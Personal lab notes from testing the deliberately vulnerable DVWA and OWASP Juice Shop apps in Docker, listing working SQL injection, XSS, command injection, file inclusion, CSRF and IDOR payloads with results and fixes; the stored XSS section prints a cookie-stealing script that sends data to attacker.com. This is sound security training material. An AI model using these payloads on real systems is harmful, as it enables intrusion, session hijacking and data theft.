# Testing Notes

Just my working notes as I went through each vulnerability. Not super polished but wanted to keep a record of what I tried and what worked.

**Setup:** DVWA + Juice Shop running in Docker, Burp Suite as proxy, security level set to Low on DVWA.

---

## DVWA

### SQL Injection

Endpoint: `http://localhost/dvwa/vulnerabilities/sqli/?id=X&Submit=Submit`

Started with just entering `1` — got back `admin/admin`. Then tried the basic injection:

```
' OR '1'='1        → returned all 5 users
' OR 1=1-- -       → same, slightly cleaner syntax
```

Checked column count with ORDER BY:
```
' ORDER BY 1-- -   → worked
' ORDER BY 2-- -   → worked
' ORDER BY 3-- -   → error → confirmed 2 columns
```

Used UNION SELECT to pull data:
```
' UNION SELECT null,database()-- -              → got: dvwa
' UNION SELECT user,password FROM users-- -     → dumped all usernames + MD5 hashes
```

Hashes I got (all MD5, easy to crack):
- admin: 5f4dcc3b5aa765d61d8327deb882cf99 (= "password")
- gordonb: e99a18c428cb38d5f260853678922e03 (= "abc123")
- 1337: 8d3533d75ae2c3966d7e0d4fcc69216b (= "charley")
- pablo: 0d107d09f5bbe40cade3de5c71e9e9b7 (= "letmein")
- smithy: 5f4dcc3b5aa765d61d8327deb882cf99 (= "password")

Also ran SQLmap to double-check and it confirmed everything.

---

### Reflected XSS

Endpoint: `http://localhost/dvwa/vulnerabilities/xss_r/?name=`

Basic script tag fired an alert:
```html
<script>alert('XSS')</script>
```

Also tested img onerror (useful when script tags are blocked):
```html
<img src=x onerror=alert('XSS')>
<svg onload=alert('XSS')>
```

All three worked. The payload is just reflected straight back into the page with no encoding.

---

### Stored XSS

Endpoint: DVWA XSS Stored (guestbook)

Name field has maxlength=10 in HTML but that is just client-side. Removed it with browser devtools then submitted:
```html
<b style="color:red">[STORED XSS]</b>
```

Shows up every time the page loads. In a real scenario you would use something like:
```html
<script>document.location='http://attacker.com?c='+document.cookie</script>
```
to steal session cookies.

---

### DOM-based XSS

Endpoint: `http://localhost/dvwa/vulnerabilities/xss_d/`

This one is different from reflected — the payload never touches the server. The page reads from the URL and writes it into the DOM with document.write(), so the browser itself executes the script.

Tested with:
```
http://localhost/dvwa/vulnerabilities/xss_d/?default=<script>alert('DOM XSS')</script>
```
Alert fired. The server response was totally clean — the injection only exists client-side.

Also tried hash-based variant which bypasses server-side filters entirely since the fragment never gets sent to the server:
```
http://localhost/dvwa/vulnerabilities/xss_d/#<img src=x onerror=alert('DOM XSS')>
```

Key difference from reflected: you cannot catch this with Burp alone because the malicious payload is never in the HTTP response. Have to look at the JavaScript source and trace where user-controlled data flows into innerHTML, document.write(), eval(), etc.

The vulnerable code was using document.write() with the default parameter value from decodeURIComponent(document.URL) without sanitising it.

---

### Command Injection

Endpoint: DVWA Command Injection (ping)

The app passes input straight to a shell command. Tried:
```
127.0.0.1; id
```
Got back:
```
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

Then tried:
```
127.0.0.1; cat /etc/passwd
```
Printed the whole passwd file. Full RCE on the web server.

Also tested pipe and AND operators:
```
127.0.0.1 | whoami     → www-data
127.0.0.1 && ls -la    → directory listing
```

---

### File Inclusion (LFI)

Endpoint: `http://localhost/dvwa/vulnerabilities/fi/?page=`

The page parameter just includes whatever file you tell it to:
```
?page=../../../../../../etc/passwd
```
Printed /etc/passwd in the browser. allow_url_include was disabled so no RFI, but LFI alone is bad enough.

Also tried PHP filter wrapper to read PHP source code:
```
?page=php://filter/convert.base64-encode/resource=index.php
```
Returns base64-encoded source of index.php. Decoded it to get the actual PHP.

---

### Passwords Stored as Unsalted MD5 (A02)

Came out of the SQL injection dump. All DVWA user passwords are stored as plain MD5 with no salt.

| Username | Hash | Cracked |
|----------|------|---------|
| admin | 5f4dcc3b5aa765d61d8327deb882cf99 | password |
| gordonb | e99a18c428cb38d5f260853678922e03 | abc123 |
| 1337 | 8d3533d75ae2c3966d7e0d4fcc69216b | charley |
| pablo | 0d107d09f5bbe40cade3de5c71e9e9b7 | letmein |
| smithy | 5f4dcc3b5aa765d61d8327deb882cf99 | password |

Cracked in seconds with crackstation.net. Without salting, identical passwords produce identical hashes.

Fix: use bcrypt, Argon2, or scrypt with a random per-user salt.

---

### Verbose SQL Error Messages (A05)

When injecting a syntax error like a single quote, the app returns the full MySQL error including server version info and partial query. This confirmed the injection point and guided my UNION-based payloads.

Should be suppressed in production with generic error pages only.

---

### Default Credentials Accepted (A05)

DVWA: admin / password — worked first try.
Juice Shop: admin@juice-sh.op / admin123 — worked first try.

---

### Missing CSRF Protection (A08)

DVWA password change form has no CSRF token. Verified by:

1. Capturing the password change request in Burp — no token in the request
2. Built a PoC page with a hidden image tag pointing to the change URL
3. If a logged-in user loads that page, password changes silently

Fuzzer also confirmed: submission accepted with no Referer header.

Fix: add per-session CSRF token validated server-side. Also set SameSite=Lax on cookies.

---

### No Logging on Failed Logins (A09)

Ran a brute force against DVWA login, then checked:
```bash
docker exec dvwa find /var/log -newer /tmp -type f
```
No new log files. Zero audit trail for the attack.

Fix: log all auth events with timestamp, source IP, username. Alert on threshold exceeded.

---

### Outdated Server Headers (A06)

DVWA response headers:
```
Server: Apache/2.4.25 (Debian)
X-Powered-By: PHP/7.0.33
```
Apache 2.4.25 = 2016. PHP 7.0 = EOL 2018. Multiple CVEs.

Fix: ServerTokens Prod in Apache config, expose_php = Off in PHP config.

---

## OWASP Juice Shop

### SQLi Login Bypass

Login form at http://localhost:3000/#/login

Email field: ' OR 1=1-- -   Password: anything

Got logged in as admin immediately. Juice Shop showed a challenge notification confirming it.

---

### Admin Panel (A01)

After logging in as admin via SQLi, navigated directly to:
```
http://localhost:3000/#/administration
```

Shows all registered user emails and all customer reviews. The check is purely frontend — the backend API endpoints respond to any valid JWT, so any authenticated user can access admin data by navigating directly.

---

### IDOR on Basket API (A01)

Intercepted POST /api/BasketItems in Burp, changed BasketId from my own (2) to another user's (1):
```json
{"ProductId":1,"BasketId":1,"quantity":1}
```
Response: 201 Created — added to someone else's basket.

Also tested GET /rest/basket/1 with my token — returned basket 1's full contents.

Classic IDOR — API trusts client-supplied ID without ownership check.

---

### No Rate Limiting on Login (A07)

50 rapid Burp Intruder requests — all got 401 with no throttling or lockout.

Hydra ran at ~100 req/s sustained with no slowdown.

Fix: rate limit to 5 attempts/IP/minute, exponential backoff, account lockout.

---

## Fuzzer Results

Ran fuzzer.py against DVWA with security=low:

```
[10:14:02] Fuzzer started -- 2024-06-15 10:14:02

[SQLi] http://localhost/dvwa/vulnerabilities/sqli/ | param=id
  [VULN] Error-based SQLi -- payload: '
  [VULN] Error-based SQLi -- payload: ' OR '1'='1
  [VULN] Time-based blind SQLi -- took 3.1s

[XSS]  http://localhost/dvwa/vulnerabilities/xss_r/ | param=name
  [VULN] Reflected XSS -- payload reflected: <script>alert('XSS')</script>

[CMDI] http://localhost/dvwa/vulnerabilities/exec/ | param=ip
  [VULN] Command injection -- saw 'uid='

[LFI]  http://localhost/dvwa/vulnerabilities/fi/ | param=page
  [VULN] LFI -- saw 'root:x:'

[CSRF] http://localhost/dvwa/vulnerabilities/csrf/
  [WARN] No CSRF token found in form
  [VULN] CSRF likely -- form submitted without token and server returned 200

Done. 9 finding(s).
```
